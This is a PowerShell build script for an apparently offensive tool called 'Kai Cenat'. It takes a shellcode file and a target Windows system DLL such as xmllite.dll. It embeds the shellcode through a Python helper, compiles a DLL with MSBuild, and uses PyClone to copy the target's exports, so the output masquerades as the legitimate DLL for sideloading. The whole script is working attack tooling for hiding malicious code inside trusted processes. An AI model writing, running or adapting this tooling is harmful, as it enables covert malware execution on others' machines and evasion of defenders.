# Script to compile Kai Cenat.

param ($shellcode, $target)

$scriptName = & { Split-Path $MyInvocation.PSCommandPath -Leaf }

# syntax checking
if (([string]::IsNullOrEmpty($shellcode)) -Or ([string]::IsNullOrEmpty($target))) {
    Write-Host "Syntax: $scriptName -shellcode shellcode.bin -target xmllite.dll"
    Exit 1
}

if (-Not (Test-Path $shellcode)) {
    Write-Host "$shellcode not found!"
    Exit 1
}

if (-Not (Test-Path $target)) {
    # attempt to locate it in C:\Windows\System32
    if (-Not (Test-Path "${env:WINDIR}\system32\${target}")) {
        Write-Host "$target not found!"
        Exit 1
    }
    else {
        $target = "${env:WINDIR}\system32\${target}"
    }
}

Write-Host "Shellcode bin file: ${shellcode}"
Write-Host "Target DLL file: ${target}"

# Get Python path
$where = "${env:WINDIR}\system32\where.exe"

if (Test-Path $where) {
    $pythonPath = & $where python
    if ($pythonPath) {
        Write-Host "Python found at: $pythonPath"
    }
    else {
        Write-Host "Python not found."
        Exit 1
    }
}

# Get MSBuild path
$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"

if (Test-Path $vsWhere) {
    $msbuildPath = & $vsWhere -latest -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe | Select-Object -First 1
    
    if ($msbuildPath) {
        Write-Host "MSBuild.exe found at: $msbuildPath"
    }
    else {
        Write-Host "MSBuild.exe not found."
        Exit 1
    }
} else {
    Write-Host "vswhere.exe not found. Please ensure Visual Studio or Build Tools are installed."
    Exit 1
}

# Activate venv
& $pythonPath -m venv venv
.\venv\Scripts\activate
& pip install pefile==2021.9.3

# Run KaiCenat.py
& python .\kaicenat.py $shellcode

# Run msbuild
$outputFile = Split-Path $target -Leaf
if (Resolve-Path -Path $outputFile -ErrorAction "SilentlyContinue") {
    Remove-Item $outputFile
}

& $msBuildPath ./KaiCenat.vcxproj /t:Rebuild /p:Configuration=Release /p:Platform=x64
if (-not ($localDll = Resolve-Path -Path ".\x64\Release\KaiCenat.dll")) {
    Write-Host "KaiCenat.dll not found."
    Exit 1
}

# Run PyClone
& python .\PyClone.py $localDll $target -o "$outputFile"
& deactivate

if (Test-Path venv) {
    # remove existing venv
    Remove-Item -Recurse .\venv
}

$outputPath = Resolve-Path -Path $outputFile
Write-Host "Output saved at $outputPath"